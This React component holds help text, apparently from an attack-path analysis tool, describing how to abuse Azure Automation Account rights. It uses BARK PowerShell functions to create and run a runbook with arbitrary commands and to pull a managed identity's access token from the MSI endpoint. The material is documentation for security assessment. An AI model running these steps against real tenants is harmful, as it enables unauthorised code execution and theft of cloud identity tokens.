import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                You can use BARK's New-AzureAutomationAccountRunBook and 
                Get-AzureAutomationAccountRunBookOutput functions to execute
                arbitrary commands against the target Automation Account.
            </p>

            <p>
                These functions require you to supply an Azure Resource Manager
                scoped JWT associated with the principal that has the privilege
                to add or modify and run Automation Account run books. There are
                several ways to acquire a JWT. For example, you may use BARK's
                Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT
                by supplying a refresh token:
            </p>

            <pre>
                <code>
                    {
                        '$ARMToken = Get-ARMTokenWithRefreshToken ` \n' +
                        '    -RefreshToken "0.ARwA6WgJJ9X2qk…" ` \n' +
                        '    -TenantID "contoso.onmicrosoft.com"'
                    }
                </code>
            </pre>

            <p>
                Now you can use BARK's New-AzureAutomationAccountRunBook function 
                to add a new runbook to the target Automation Account, specifying
                a command to execute using the -Script parameter:
            </p>

            <pre>
                <code>
                    {
                        'New-AzureAutomationAccountRunBook `\n' +
                        '    -Token $ARMToken `\n' +
                        '    -RunBookName "MyCoolRunBook" `\n' +
                        '    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `\n' +
                        '    -Script "whoami"'
                    }
                </code>
            </pre>

            <p>
                After adding the new runbook, you must execute it and fetch its 
                output. You can do this automatically with BARK's
                Get-AzureAutomationAccountRunBookOutput function: 
            </p>

            <pre>
                <code>
                    {
                        'Get-AzureAutomationAccountRunBookOutput `\n' +
                        '    -Token $ARMToken `\n' +
                        '    -RunBookName "MyCoolRunBook" `\n' +
                        '    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'
                    }
                </code>
            </pre>

            <p>
                If the Automation Account has a managed identity assignment, you can use
                these two functions to retrieve a JWT for the service principal like this:
            </p>

            <pre>
                <code>
                    {
                        '$Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token\n' +
                        'New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script\n' +
                        'Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'
                    }
                </code>
            </pre>

            <p>
                If successful, the output will include a JWT for the managed identity 
                service principal.
            </p>
        </>
    );
};

export default Abuse;
